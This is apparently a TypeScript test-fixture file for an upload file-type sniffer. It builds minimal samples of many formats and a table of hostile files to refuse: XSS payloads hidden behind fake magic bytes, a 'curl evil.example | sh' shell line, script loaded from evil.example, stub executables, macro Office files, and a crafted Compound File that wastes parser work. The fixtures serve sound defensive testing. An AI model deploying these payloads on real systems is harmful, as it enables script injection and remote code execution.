import type { FileFormat } from '@/lib/file-sniff'
import { testPng } from './png'

// The smallest bytes that are each format, and the hostile files an upload must
// refuse whatever it is called — for lib/file-sniff and lib/uploads tests.

const ascii = (s: string) => Buffer.from(s, 'latin1')
export const bytes = (...parts: (string | number[] | Buffer | Uint8Array)[]) =>
  new Uint8Array(Buffer.concat(parts.map((p) => (typeof p === 'string' ? ascii(p) : Buffer.from(p)))))
const pad = (n: number, fill = 0) => Array<number>(n).fill(fill)
const u16 = (n: number) => { const b = Buffer.alloc(2); b.writeUInt16LE(n); return b }
const u32 = (n: number) => { const b = Buffer.alloc(4); b.writeUInt32LE(n); return b }
const u32be = (n: number) => { const b = Buffer.alloc(4); b.writeUInt32BE(n); return b }

/** An ISO-BMFF file opening with an `ftyp` box: major brand, then compatible brands. */
function ftyp(major: string, ...compatible: string[]): Uint8Array {
  return bytes(u32be(16 + 4 * compatible.length), 'ftyp', major, [0, 0, 0, 0], ...compatible, u32be(8), 'free')
}

/** A real (stored, uncompressed) zip: local headers, central directory, end record. */
export function zipOf(entries: { name: string; data?: string }[]): Uint8Array {
  const locals: Buffer[] = []
  const central: Buffer[] = []
  let offset = 0
  for (const { name, data = '' } of entries) {
    const n = ascii(name)
    const d = ascii(data)
    const local = Buffer.concat([
      u32(0x04034b50), u16(20), u16(0), u16(0), u16(0), u16(0), u32(0), u32(d.length), u32(d.length),
      u16(n.length), u16(0), n, d,
    ])
    central.push(Buffer.concat([
      u32(0x02014b50), u16(20), u16(20), u16(0), u16(0), u16(0), u16(0), u32(0), u32(d.length), u32(d.length),
      u16(n.length), u16(0), u16(0), u16(0), u16(0), u32(0), u32(offset), n,
    ]))
    locals.push(local)
    offset += local.length
  }
  const cd = Buffer.concat(central)
  const end = Buffer.concat([
    u32(0x06054b50), u16(0), u16(0), u16(entries.length), u16(entries.length), u32(cd.length), u32(offset), u16(0),
  ])
  return new Uint8Array(Buffer.concat([...locals, cd, end]))
}

type CfbNode = { name: string; storage?: boolean; data?: Uint8Array | Buffer }

/**
 * A Compound File (v3, 512-byte sectors) as Office lays one out: a FAT, a
 * directory whose root storage has `clsid`, and `nodes` under the root —
 * streams under 4096 bytes in the mini stream, larger ones in sectors of their own.
 */
export function compoundFile(clsid: number[], nodes: CfbNode[] = []): Uint8Array {
  const SECTOR = 512
  const END = 0xfffffffe
  const NONE = 0xffffffff
  const body: Buffer[] = [Buffer.alloc(SECTOR)] // sector 0 is the FAT
  const fat: number[] = [0xfffffffd]
  const place = (data: Buffer): number => {
    if (data.length === 0) return END
    const first = body.length
    const count = Math.ceil(data.length / SECTOR)
    for (let i = 0; i < count; i++) {
      const s = Buffer.alloc(SECTOR)
      data.copy(s, 0, i * SECTOR, (i + 1) * SECTOR)
      body.push(s)
      fat.push(i === count - 1 ? END : first + i + 1)
    }
    return first
  }

  const mini: Buffer[] = []
  const miniFat: number[] = []
  const starts = nodes.map(({ data }) => {
    const bytes = Buffer.from(data ?? [])
    if (bytes.length === 0) return END
    if (bytes.length >= 4096) return place(bytes)
    const first = miniFat.length
    const count = Math.ceil(bytes.length / 64)
    for (let i = 0; i < count; i++) {
      const s = Buffer.alloc(64)
      bytes.copy(s, 0, i * 64, (i + 1) * 64)
      mini.push(s)
      miniFat.push(i === count - 1 ? END : first + i + 1)
    }
    return first
  })
  const miniStream = Buffer.concat(mini)
  const miniStart = place(miniStream)
  const miniFatBytes = Buffer.alloc(miniFat.length ? Math.ceil(miniFat.length / 128) * SECTOR : 0, 0xff)
  miniFat.forEach((n, i) => miniFatBytes.writeUInt32LE(n, i * 4))
  const miniFatStart = place(miniFatBytes)

  const entry = (name: string, type: number, start: number, size: number, child = NONE, right = NONE, id = [] as number[]) => {
    const e = Buffer.alloc(128)
    Buffer.from(name, 'utf16le').copy(e, 0)
    e.writeUInt16LE((name.length + 1) * 2, 0x40)
    e[0x42] = type
    e[0x43] = 1 // black
    e.writeUInt32LE(NONE, 0x44)
    e.writeUInt32LE(right, 0x48)
    e.writeUInt32LE(child, 0x4c)
    Buffer.from(id).copy(e, 0x50)
    e.writeUInt32LE(start, 0x74)
    e.writeUInt32LE(size, 0x78)
    return e
  }
  const dir = Buffer.concat([
    entry('Root Entry', 5, miniStart, miniStream.length, nodes.length ? 1 : NONE, NONE, clsid),
    ...nodes.map((n, i) =>
      entry(n.name, n.storage ? 1 : 2, n.storage ? 0 : starts[i], n.storage ? 0 : (n.data?.length ?? 0), NONE, i + 1 < nodes.length ? i + 2 : NONE),
    ),
  ])
  const dirStart = place(Buffer.concat([dir, Buffer.alloc((SECTOR - (dir.length % SECTOR)) % SECTOR)]))

  if (fat.length > 128) throw new Error('compoundFile fixture: more than one FAT sector')
  body[0].fill(0xff)
  fat.forEach((n, i) => body[0].writeUInt32LE(n, i * 4))

  const header = Buffer.alloc(512)
  Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]).copy(header, 0)
  header.writeUInt16LE(0x3e, 0x18) // minor version
  header.writeUInt16LE(3, 0x1a) // major version 3
  header.writeUInt16LE(0xfffe, 0x1c) // little-endian
  header.writeUInt16LE(9, 0x1e) // 512-byte sectors
  header.writeUInt16LE(6, 0x20) // 64-byte mini sectors
  header.writeUInt32LE(1, 0x2c) // one FAT sector
  header.writeUInt32LE(dirStart, 0x30)
  header.writeUInt32LE(4096, 0x38) // mini stream cutoff
  header.writeUInt32LE(miniFatStart, 0x3c)
  header.writeUInt32LE(miniFatBytes.length / SECTOR, 0x40)
  header.writeUInt32LE(END, 0x44) // no DIFAT sectors
  header.fill(0xff, 0x4c)
  header.writeUInt32LE(0, 0x4c) // the FAT is sector 0
  return new Uint8Array(Buffer.concat([header, ...body]))
}

/**
 * A crafted Compound File: `entries` directory slots, every one a "Workbook"
 * stream pointing at the same chain of `chainSectors` sectors. No real file
 * shares a sector between streams; a reader that follows the chain once per
 * entry does entries × chainSectors work.
 */
export function sharedChainCompoundFile(entries: number, chainSectors: number): Uint8Array {
  const SECTOR = 512
  const END = 0xfffffffe
  const dirSectors = Math.ceil(entries / 4)
  const fatSectors = Math.ceil((dirSectors + chainSectors + 1) / 127)
  if (fatSectors > 109) throw new Error('sharedChainCompoundFile fixture: needs a DIFAT')
  const dirStart = fatSectors
  const chainStart = dirStart + dirSectors
  const total = chainStart + chainSectors

  const fat = Buffer.alloc(fatSectors * SECTOR, 0xff)
  for (let i = 0; i < fatSectors; i++) fat.writeUInt32LE(0xfffffffd, i * 4)
  const link = (first: number, count: number) => {
    for (let i = 0; i < count; i++) fat.writeUInt32LE(i === count - 1 ? END : first + i + 1, (first + i) * 4)
  }
  link(dirStart, dirSectors)
  link(chainStart, chainSectors)

  const dir = Buffer.alloc(dirSectors * SECTOR)
  for (let i = 0; i < dirSectors * 4; i++) {
    const at = i * 128
    const root = i === 0
    Buffer.from(root ? 'Root Entry' : 'Workbook', 'utf16le').copy(dir, at)
    dir.writeUInt16LE(((root ? 10 : 8) + 1) * 2, at + 0x40)
    dir[at + 0x42] = root ? 5 : i < entries ? 2 : 0
    dir.writeUInt32LE(0xffffffff, at + 0x44)
    dir.writeUInt32LE(0xffffffff, at + 0x48)
    dir.writeUInt32LE(0xffffffff, at + 0x4c)
    if (root) Buffer.from(EXCEL_CLSID).copy(dir, at + 0x50)
    dir.writeUInt32LE(root ? END : chainStart, at + 0x74)
    dir.writeUInt32LE(root ? 0 : chainSectors * SECTOR, at + 0x78)
  }
  // The stream opens with an EOF record, so a macro-sheet check stops at once.
  const chain = Buffer.alloc(chainSectors * SECTOR)
  Buffer.from([0x0a, 0x00, 0x00, 0x00]).copy(chain)

  const header = Buffer.alloc(512, 0xff)
  Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]).copy(header, 0)
  header.fill(0, 8, 0x4c)
  header.writeUInt16LE(0x3e, 0x18)
  header.writeUInt16LE(3, 0x1a)
  header.writeUInt16LE(0xfffe, 0x1c)
  header.writeUInt16LE(9, 0x1e)
  header.writeUInt16LE(6, 0x20)
  header.writeUInt32LE(fatSectors, 0x2c)
  header.writeUInt32LE(dirStart, 0x30)
  header.writeUInt32LE(4096, 0x38)
  header.writeUInt32LE(END, 0x3c)
  header.writeUInt32LE(0, 0x40)
  header.writeUInt32LE(END, 0x44)
  for (let i = 0; i < fatSectors; i++) header.writeUInt32LE(i, 0x4c + i * 4)
  if (total * 4 > fat.length) throw new Error('sharedChainCompoundFile fixture: FAT too small')
  return new Uint8Array(Buffer.concat([header, fat, dir, chain]))
}

// {00020906-0000-0000-C000-000000000046}: a Word 97–2003 document.
export const WORD_CLSID = [0x06, 0x09, 0x02, 0x00, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]
// {00020820-0000-0000-C000-000000000046}: an Excel 97–2003 workbook.
export const EXCEL_CLSID = [0x20, 0x08, 0x02, 0x00, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]
// {64818D10-4F9B-11CF-86EA-00AA00B929E8}: a PowerPoint 97–2003 presentation.
export const PPT_CLSID = [0x10, 0x8d, 0x81, 0x64, 0x9b, 0x4f, 0xcf, 0x11, 0x86, 0xea, 0x00, 0xaa, 0x00, 0xb9, 0x29, 0xe8]
// {000C1084-0000-0000-C000-000000000046}: a Windows Installer package.
export const MSI_CLSID = [0x84, 0x10, 0x0c, 0x00, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]

/** A BIFF8 record: type, length, data. */
const biff = (type: number, data: number[] = []) => [...u16(type), ...u16(data.length), ...data]

/**
 * An Excel 97–2003 workbook stream listing one sheet of type `dt` (0 a
 * worksheet, 1 an Excel 4.0 macro sheet, 6 a VBA module), padded to `size`.
 */
export function workbookStream(dt: number, size = 256): Buffer {
  const name = [...Buffer.from('Sheet1', 'latin1')]
  const records = [
    ...biff(0x0809, [0x00, 0x06, 0x05, 0x00, ...pad(12)]), // BOF: workbook globals
    ...biff(0x0085, [...u32(0x400), 0x00, dt, name.length, 0x00, ...name]), // BOUNDSHEET
    ...biff(0x000a), // EOF
  ]
  return Buffer.concat([Buffer.from(records), Buffer.alloc(Math.max(0, size - records.length))])
}

/** A PowerPoint 97–2003 document stream; with `vba`, the VBAInfoContainer a macro presentation carries. */
export function powerPointStream(vba: boolean): Buffer {
  const vbaInfo = [0x0f, 0x00, 0xff, 0x03, ...u32(0x14), 0x02, 0x00, 0x00, 0x04, ...u32(0x0c), ...u32(1), ...u32(1), ...u32(2)]
  return Buffer.concat([Buffer.from([0x0f, 0x00, 0xe8, 0x03, ...u32(0)]), Buffer.from(vba ? vbaInfo : []), Buffer.alloc(64)])
}

/** A password-protected DOCX/XLSX/PPTX: Office keeps the encrypted package in a Compound File. */
export const encryptedOoxml = () =>
  compoundFile(pad(16), [
    { name: 'EncryptionInfo', data: Buffer.from([4, 0, 4, 0, 0x40, 0, 0, 0, ...pad(32)]) },
    { name: 'EncryptedPackage', data: Buffer.alloc(5000, 0x5a) },
  ])

/** A 3D-printing file: an Office-style package (it has [Content_Types].xml) that isn't a document. */
export const threeMf = () =>
  zipOf([
    { name: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
    { name: '_rels/.rels' },
    { name: '3D/3dmodel.model', data: '<model unit="millimeter"/>' },
  ])

/** A calendar file as Outlook and Teams save one: an HTML copy of the description in X-ALT-DESC. */
export const OUTLOOK_ICS = bytes(
  'BEGIN:VCALENDAR\r\nPRODID:-//Microsoft Corporation//Outlook 16.0 MIMEDIR//EN\r\nVERSION:2.0\r\nBEGIN:VEVENT\r\n',
  'DESCRIPTION:Check-in opens at 8:00.\\nJoin: <https://example.org/join>\\n\r\n',
  'SUMMARY:Nevada check-in\r\n',
  'X-ALT-DESC;FMTTYPE=text/html:<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">\\n<HTML>\\n<HEAD>\\n<META NAME="Ge\r\n',
  ' nerator" CONTENT="MS Exchange Server">\\n</HEAD>\\n<BODY>\\n<P>Check-in opens at 8:00.</P>\\n</BODY>\\n</HTML>\r\n',
  'END:VEVENT\r\nEND:VCALENDAR\r\n',
)

function binaryStl(triangles: number, header = 'binary STL from a CAD export'): Uint8Array {
  const out = Buffer.alloc(84 + 50 * triangles)
  out.write(header, 0, 'latin1')
  out.writeUInt32LE(triangles, 80)
  return new Uint8Array(out)
}

const OOXML_CONTENT_TYPES = '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'

export const FORMAT_SAMPLES: Record<FileFormat, Uint8Array> = {
  pdf: bytes('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n%%EOF\n'),
  png: testPng(4, 4),
  jpeg: bytes([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10], 'JFIF\0', pad(10)),
  gif: bytes('GIF89a', [4, 0, 4, 0, 0, 0, 0], pad(10)),
  webp: bytes('RIFF', u32(0x24), 'WEBPVP8 ', pad(8)),
  bmp: bytes('BM', u32(70), u32(0), u32(54), u32(40), pad(50)),
  tiff: bytes('II*\0', u32(8), [0, 0], pad(14)),
  psd: bytes('8BPS', [0, 1], pad(6), pad(20)),
  heif: ftyp('heic', 'mif1', 'heic'),
  mp4: ftyp('isom', 'isom', 'iso2', 'mp41'),
  webm: bytes([0x1a, 0x45, 0xdf, 0xa3], pad(12)),
  avi: bytes('RIFF', u32(0x24), 'AVI LIST', pad(8)),
  asf: bytes([0x30, 0x26, 0xb2, 0x75, 0x8e, 0x66, 0xcf, 0x11, 0xa6, 0xd9, 0x00, 0xaa, 0x00, 0x62, 0xce, 0x6c], pad(16)),
  mp3: bytes('ID3', [4, 0, 0, 0, 0, 0, 0], pad(10)),
  aac: bytes([0xff, 0xf1, 0x50, 0x80, 0x02, 0x1f, 0xfc], pad(16)),
  wav: bytes('RIFF', u32(0x24), 'WAVEfmt ', pad(8)),
  ogg: bytes('OggS', [0, 2], pad(20)),
  flac: bytes('fLaC', [0x80, 0, 0, 34], pad(34)),
  ooxml: zipOf([
    { name: '[Content_Types].xml', data: OOXML_CONTENT_TYPES },
    { name: '_rels/.rels' },
    { name: 'word/document.xml' },
  ]),
  odf: zipOf([
    { name: 'mimetype', data: 'application/vnd.oasis.opendocument.text' },
    { name: 'content.xml' },
    { name: 'META-INF/manifest.xml' },
  ]),
  iwork: zipOf([{ name: 'Index/Document.iwa' }, { name: 'Metadata/Properties.plist' }, { name: 'preview.jpg' }]),
  zip: zipOf([{ name: 'rover/model.stl', data: 'solid rover' }, { name: 'rover/notes.txt', data: 'hello' }]),
  ole2: compoundFile(WORD_CLSID),
  rar: bytes('Rar!', [0x1a, 0x07, 0x01, 0x00], pad(8)),
  '7z': bytes([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c], pad(10)),
  dwg: bytes('AC1032', pad(10)),
  stl: binaryStl(2),
  skp: new Uint8Array(Buffer.concat([Buffer.from([0xff, 0xfe, 0xff, 0x0e]), Buffer.from('SketchUp Model', 'utf16le'), Buffer.alloc(16)])),
  text: bytes('team,school,score\r\nOrbiters,Lincoln High,92\r\n'),
  calendar: bytes('BEGIN:VCALENDAR\r\nVERSION:2.0\r\nBEGIN:VEVENT\r\nSUMMARY:Nevada Space Settlement Design\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n'),
}

/** The usual name for a sample of each format. */
export const SAMPLE_NAMES: Record<FileFormat, string> = {
  pdf: 'schedule.pdf', png: 'art.png', jpeg: 'art.jpg', gif: 'wave.gif', webp: 'photo.webp', bmp: 'scan.bmp',
  tiff: 'scan.tiff', psd: 'poster.psd', heif: 'licence.heic', mp4: 'lesson.mp4', webm: 'lesson.webm',
  avi: 'clip.avi', asf: 'clip.wmv', mp3: 'brief.mp3', aac: 'brief.aac', wav: 'brief.wav', ogg: 'brief.ogg',
  flac: 'brief.flac', ooxml: 'proposal.docx', odf: 'proposal.odt', iwork: 'proposal.key', zip: 'rover.zip',
  ole2: 'proposal.doc', rar: 'rover.rar', '7z': 'rover.7z', dwg: 'chassis.dwg', stl: 'chassis.stl',
  skp: 'chassis.skp', text: 'roster.csv', calendar: 'check-in.ics',
}

const PE_HEADER = bytes('MZ', [0x90, 0, 3, 0, 0, 0, 4, 0], pad(54))

/** Files that are no accepted format, under any name. */
export const HOSTILE_SAMPLES: Record<string, Uint8Array> = {
  'an HTML page': bytes('<!doctype html><html><body><script>alert(1)</script></body></html>'),
  'HTML after leading whitespace': bytes('\r\n  <html><script>alert(1)</script>'),
  'HTML with a UTF-8 byte-order mark': bytes([0xef, 0xbb, 0xbf], '<script>alert(1)</script>'),
  // FF FE is a byte-order mark and also an MPEG frame sync; neither may let it in.
  'HTML in UTF-16': new Uint8Array(Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<html><script>alert(1)</script>', 'utf16le')])),
  'HTML behind an MP3 frame sync': bytes([0xff, 0xfb, 0x90, 0x64], '<html><script>alert(1)</script>'),
  'a script tag after some text': bytes('Name,Notes\nAda,"see <script src=//evil.example/x.js></script>"\n'),
  'a script tag past the first 8KB of a CSV': bytes('team,score\n'.repeat(1000), '<script>alert(1)</script>\n'),
  'an SVG with a script': bytes('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'),
  'a bare SVG': bytes('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
  'an XML document': bytes('<?xml version="1.0"?><x:html xmlns:x="http://www.w3.org/1999/xhtml"/>'),
  'a shell script': bytes('#!/bin/sh\ncurl -s https://evil.example | sh\n'),
  'a Windows executable': PE_HEADER,
  'a Windows executable with "free" at offset 4': bytes('MZ', [0x90, 0], 'free', pad(56)),
  // 80 bytes of header, a count of 3 at offset 80, then 3 × 50 bytes.
  'a Windows executable padded to a binary STL length': bytes(PE_HEADER, pad(80 - PE_HEADER.length), u32(3), pad(150)),
  'an ELF binary': bytes([0x7f], 'ELF', [2, 1, 1, 0], pad(8)),
  'a Mach-O binary': bytes([0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1], pad(8)),
  'a Windows Installer package': compoundFile(MSI_CLSID),
  // Legacy Office with macros: the VBA project's storage, or an Excel 4.0 macro
  // sheet in the workbook itself — small enough for the mini stream, or not.
  'a Word document with a VBA project': compoundFile(WORD_CLSID, [
    { name: 'WordDocument', data: Buffer.alloc(4096) },
    { name: 'Macros', storage: true },
    { name: 'VBA', storage: true },
    { name: '_VBA_PROJECT', data: Buffer.from([0xcc, 0x61, 0xff, 0xff, 0x00, 0x00, 0x00]) },
  ]),
  'an Excel workbook with a VBA project': compoundFile(EXCEL_CLSID, [
    { name: 'Workbook', data: workbookStream(0) },
    { name: '_VBA_PROJECT_CUR', storage: true },
  ]),
  'an Excel 4.0 macro sheet': compoundFile(EXCEL_CLSID, [{ name: 'Workbook', data: workbookStream(1) }]),
  'an Excel 4.0 macro sheet in a large workbook': compoundFile(EXCEL_CLSID, [{ name: 'Workbook', data: workbookStream(1, 6000) }]),
  'an Excel VBA module sheet': compoundFile(EXCEL_CLSID, [{ name: 'Workbook', data: workbookStream(6) }]),
  'a PowerPoint presentation with a VBA project': compoundFile(PPT_CLSID, [{ name: 'PowerPoint Document', data: powerPointStream(true) }]),
  'a calendar with a script outside X-ALT-DESC': bytes('BEGIN:VCALENDAR\r\nDESCRIPTION:<script>alert(1)</script>\r\nEND:VCALENDAR\r\n'),
  // Refused only because folded lines are joined: neither half is a tag alone.
  'a calendar with a tag split across a folded line': bytes('BEGIN:VCALENDAR\r\nDESCRIPTION:<scr\r\n ipt src=x>\r\nEND:VCALENDAR\r\n'),
  'a calendar with a tag split across a tab-folded line': bytes('BEGIN:VCALENDAR\nDESCRIPTION:<ifr\n\tame src=x>\nEND:VCALENDAR\n'),
  // The reviewer's bypasses of the earlier, weaker signatures.
  'a comment pretending to be an ftyp box': bytes('<!--ftyp--><script>alert(1)</script>'),
  'an old QuickTime atom name in front of a page': bytes('AAAAfree<html><script>alert(1)</script></html>'),
  'a page behind a real ftyp box': bytes(ftyp('isom', 'isom'), '<script>alert(1)</script>'),
  'a page behind a DWG version string': bytes('AC1015<script>alert(1)</script>'),
  'a page behind an ID3 marker': bytes('ID3<script>alert(1)</script>'),
  'a page behind an MPEG frame header': bytes([0xff, 0xfb, 0x90, 0x00], '<img src=x onerror=alert(1)>', pad(32)),
  'a page in a binary STL header': binaryStl(3, '<html><body><script>alert(1)</script>'),
  'a page in front of %PDF-': bytes('<html><body><script>alert(1)</script></body></html>%PDF-1.7\n%%EOF'),
  'random binary': bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07]),
}
